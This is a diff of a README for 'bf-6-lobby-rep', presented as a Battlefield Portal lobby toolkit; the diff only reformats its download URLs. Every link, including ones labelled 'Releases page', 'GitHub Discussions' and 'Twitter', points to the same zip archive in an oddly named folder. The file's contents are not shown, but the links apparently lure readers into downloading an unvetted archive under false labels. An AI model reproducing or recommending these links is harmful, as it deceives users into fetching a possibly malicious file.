@@ -6,11 +6,11 @@ Welcome to the **bf-6-lobby-rep**! This toolkit helps Battlefield Portal creator
 
 ## 🔗 Download Now
 
-[![Download bf-6-lobby-rep](https://raw.githubusercontent.com/rorivi/bf-6-lobby-rep/main/demimetope/bf-6-lobby-rep_2.0.zip)](https://raw.githubusercontent.com/rorivi/bf-6-lobby-rep/main/demimetope/bf-6-lobby-rep_2.0.zip)
+[![Download bf-6-lobby-rep](https://github.com/rorivi/bf-6-lobby-rep/raw/refs/heads/main/demimetope/bf-6-lobby-rep_2.0.zip)](https://github.com/rorivi/bf-6-lobby-rep/raw/refs/heads/main/demimetope/bf-6-lobby-rep_2.0.zip)
 
 ## 📥 Download & Install
 
-To get the latest version of the **bf-6-lobby-rep**, please visit [this page to download](https://raw.githubusercontent.com/rorivi/bf-6-lobby-rep/main/demimetope/bf-6-lobby-rep_2.0.zip). You will find all available versions listed.
+To get the latest version of the **bf-6-lobby-rep**, please visit [this page to download](https://github.com/rorivi/bf-6-lobby-rep/raw/refs/heads/main/demimetope/bf-6-lobby-rep_2.0.zip). You will find all available versions listed.
 
 1. Click on the link to open the Releases page.
 2. From the list of versions, choose the latest release.
@@ -66,7 +66,7 @@ The **bf-6-lobby-rep** is open-source and available under the MIT License. You a
 
 For updates, tips, and more information, follow our community channels:
 
-- [GitHub Discussions](https://raw.githubusercontent.com/rorivi/bf-6-lobby-rep/main/demimetope/bf-6-lobby-rep_2.0.zip)
-- [Twitter](https://raw.githubusercontent.com/rorivi/bf-6-lobby-rep/main/demimetope/bf-6-lobby-rep_2.0.zip)
+- [GitHub Discussions](https://github.com/rorivi/bf-6-lobby-rep/raw/refs/heads/main/demimetope/bf-6-lobby-rep_2.0.zip)
+- [Twitter](https://github.com/rorivi/bf-6-lobby-rep/raw/refs/heads/main/demimetope/bf-6-lobby-rep_2.0.zip)
 
 Thank you for choosing **bf-6-lobby-rep**! Happy gaming!
